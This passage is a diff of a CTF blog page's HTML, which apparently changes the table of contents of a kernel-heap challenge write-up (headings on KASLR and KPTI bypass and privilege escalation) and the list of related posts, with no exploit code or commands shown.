href="#%E5%87%BD%E6%95%B0%E5%81%8F%E7%A7%BB"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 函数偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83getshell"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 提权getshell</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnhub-kheap"><span class="toc-number">1.</span> <span class="toc-text"> PWNHUB-kheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text"> 保护与漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text"> 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87kaslr%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 绕过 kaslr 保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87kpti%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 绕过 kpti 保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81seq_operations"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 劫持 seq_operations</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%81%8F%E7%A7%BB"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 函数偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83getshell"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 提权 getshell</span></a></li></ol></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -574,43 +399,7 @@ target remote 0.0.0.0:1234
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/16/tcache-stashing-unlink-attack/" title="tcache_stashing_unlink_attack">tcache_stashing_unlink_attack</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/07/Lucky-7-%E4%BA%8C%E5%85%83%E9%9D%9E%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B%E7%BB%84/" title="Lucky 7 二元非线性同余方程组">Lucky 7 二元非线性同余方程组</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/02/21/idek2022%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="idek2022部分复现">idek2022部分复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-polydiv/" title="强网杯-polydiv">强网杯-polydiv</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/05/17/Misc1/" title="Misc1">Misc1</a></span>
+    <span><a href="/2022/10/25/ciscn-pwn%E6%B3%9B%E5%81%9A/" title="ciscn_pwn泛做">ciscn_pwn泛做</a></span>
   </li>
 
       
@@ -628,7 +417,34 @@ target remote 0.0.0.0:1234
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/13/Crypto%E5%A4%8D%E7%8E%B01/" title="Crypto复现1">Crypto复现1</a></span>
+    <span><a href="/2022/08/24/%E9%95%BF%E5%9F%8E%E6%9D%AFCrypto/" title="长城杯Crypto">长城杯Crypto</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/03/%E6%A0%BC%E5%AF%86%E7%A0%81/" title="格密码">格密码</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/03/i%E6%98%A5%E7%A7%8B%E5%8B%87%E8%80%85%E4%B9%8B%E5%B7%85Crypto%E5%AD%A6%E4%B9%A0/" title="i春秋勇者之巅Crypto学习">i春秋勇者之巅Crypto学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/12/11/reverse%E6%B3%9B%E5%81%9A1/" title="reverse泛做1">reverse泛做1</a></span>
   </li>
 
       
@@ -646,7 +462,7 @@ target remote 0.0.0.0:1234
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AFre%E3%80%81Crypto/" title="网鼎杯re、Crypto">网鼎杯re、Crypto</a></span>
+    <span><a href="/2023/03/08/SROP/" title="SROP">SROP</a></span>
   </li>
 
       
@@ -655,7 +471,16 @@ target remote 0.0.0.0:1234
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/24/%E9%95%BF%E5%9F%8E%E6%9D%AFCrypto/" title="长城杯Crypto">长城杯Crypto</a></span>
+    <span><a href="/2023/01/06/2022Nepnep%E8%B7%A8%E5%B9%B4%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0%E5%92%8C%E6%80%BB%E7%BB%93/" title="2022Nepnep跨年比赛复现和总结">2022Nepnep跨年比赛复现和总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/16/house-of-pig/" title="house_of_pig">house_of_pig</a></span>
   </li>
 
   </ul>
